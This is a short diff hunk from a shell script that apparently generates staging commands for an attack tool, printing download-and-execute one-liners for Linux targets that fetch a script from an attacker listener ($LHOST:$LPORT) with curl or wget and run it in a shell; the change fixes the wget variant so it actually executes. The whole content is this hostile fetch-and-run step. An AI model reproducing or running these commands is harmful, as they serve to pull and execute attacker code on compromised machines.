@@ -100,7 +100,7 @@ done
 if [ $ARCH == "linux" ]; then
     echo ""
     echo "curl http://$LHOST:$LPORT/download-curl.sh | sh"
-    echo "wget http://$LHOST:$LPORT/download-wget.sh | sh download-wget.sh"
+    echo "wget http://$LHOST:$LPORT/download-wget.sh ; sh download-wget.sh"
     echo ""
 fi
 if [ $ARCH == "windows" ]; then
